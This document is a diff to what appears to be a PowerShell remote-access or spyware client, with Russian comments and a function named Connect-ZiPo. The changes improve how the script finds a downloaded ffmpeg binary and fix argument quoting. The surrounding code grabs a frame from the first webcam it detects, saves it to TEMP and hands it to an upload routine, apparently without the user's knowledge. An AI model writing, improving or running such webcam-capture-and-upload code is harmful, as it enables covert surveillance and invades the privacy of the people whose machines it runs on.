@@ -294,31 +294,43 @@ function Connect-ZiPo {
         Write-Host "[*] No camera found via WIA. Checking ffmpeg..."
         $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
         if ($LASTEXITCODE -ne 0) {
-            Write-Host "[*] ffmpeg not found. Executing !downloadffmpeg command..."
+            Write-Host "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..."
             $downloadResult = Download-Ffmpeg
             Write-Host $downloadResult
-            if ($downloadResult -match "^\[\+\]") {
-                # Предполагаем, что ffmpeg.exe находится в $env:TEMP\ffmpeg_extracted\ffmpeg.exe после распаковки
-                $ffmpegPath = Join-Path "$env:TEMP\ffmpeg_extracted" "ffmpeg.exe"
+            if ($downloadResult -match "^\[\+\]\s+ffmpeg downloaded and extracted successfully to:\s+(.+ffmpeg\.exe)$") {
+                $ffmpegPath = $Matches[1]
             }
             else {
                 return "[ERROR] Unable to download ffmpeg."
             }
         }
         Write-Host "[*] Using ffmpeg at: $ffmpegPath"
-        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
         
-        # Получаем список устройств через ffmpeg (live логирование)
-        $cameraOutput = & cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1
+        # Если указанный путь не существует, выполняем рекурсивный поиск в каталоге распаковки
+        if (-not (Test-Path $ffmpegPath)) {
+            $extractPath = "$env:TEMP\ffmpeg_extracted"
+            $ffmpegFile = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($ffmpegFile) {
+                $ffmpegPath = $ffmpegFile.FullName
+                Write-Host "[*] Updated ffmpeg path: $ffmpegPath"
+            }
+            else {
+                return "[ERROR] ffmpeg.exe not found after extraction."
+            }
+        }
+        
+        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
+        # Получаем список устройств через ffmpeg
+        $cameraOutput = & cmd /c "`"$ffmpegPath`" -list_devices true -f dshow -i dummy" 2>&1
         Write-Host "[*] ffmpeg device list:"
         Write-Host $cameraOutput
         
         # Извлекаем название первого найденного устройства DirectShow
         $cameraName = ($cameraOutput | Select-String "DirectShow video devices" -Context 0,10 |
-                       ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
+                        ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
         if ($cameraName) {
             Write-Host "[*] Camera detected: $cameraName. Capturing image..."
-            Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 ""$tempImage""" -NoNewWindow -Wait
+            Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
             if (Test-Path $tempImage) {
                 Write-Host "[*] Image captured successfully."
                 return Upload-File $tempImage
@@ -335,6 +347,7 @@ function Connect-ZiPo {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
